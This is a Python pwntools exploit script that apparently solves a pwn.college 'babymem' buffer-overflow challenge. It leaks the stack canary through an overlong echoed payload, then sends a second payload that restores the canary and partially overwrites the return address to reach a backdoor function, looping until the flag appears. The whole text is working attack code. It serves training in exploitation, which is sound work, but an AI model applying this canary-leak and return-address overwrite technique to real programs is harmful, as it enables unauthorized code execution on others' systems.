from pwn import *


while True:
    p = process('/challenge/babymem_level14.1')

    p.recvuntil('Payload size:')
    p.sendline(b'153')

    payload = b'REPEAT' + b'a' * 147

    #p.recvline('Send your payload')
    p.sendline(payload)

    p.recvuntil('You said: ')
    str = p.recvuntil('Backdoor triggered!')
    canary = bytearray()
    canary.append(0)
    for i in range(153,160):
        canary.append(str[i])

    #print(canary)
    #p.recvuntil('Payload size:')
    p.sendline(b'442')
    payload =  b'a' * 424 + canary + b'a' * 8 + p16(0x152c)
    p.recvuntil('Send your payload')
    p.sendline(payload)

    #p.interactive()
    str = p.recvall(1)
    print(str)
    if str.find(b'pwn.college{') != -1:
        print(str)
        break
